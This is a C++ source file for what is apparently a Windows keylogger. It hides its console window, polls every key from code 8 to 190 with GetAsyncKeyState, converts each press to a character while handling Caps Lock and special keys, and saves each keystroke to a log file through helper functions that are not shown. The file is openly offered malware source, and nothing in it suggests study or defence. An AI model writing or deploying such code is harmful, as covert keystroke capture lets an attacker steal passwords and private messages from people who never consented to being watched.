#include <bits/stdc++.h>

#include "utils.hpp"

#define PRESSED_KEY_CODE -32767

int main() {
    // hide the terminal
    utils::hide_terminal();

    while (true) {
        // checking the key_codes
        for (int key_code = 8; key_code <= 190; ++key_code) {
            // if the key has been pressed
            if (PRESSED_KEY_CODE == GetAsyncKeyState(key_code)) {
                std::string data;
                // check if it is a special key code
                if (utils::is_special_char(key_code)) {
                    data = utils::translate_special_key_int_to_string(key_code);
                } else {
                    if (GetKeyState(VK_CAPITAL)) {
                        data = std::string(1, (char) key_code);
                    } else {
                        data = std::string(1, (char) std::tolower(key_code));
                    }
                }

                // save it in the logging file
                utils::save_log_data(data);
            }
        }
    }
}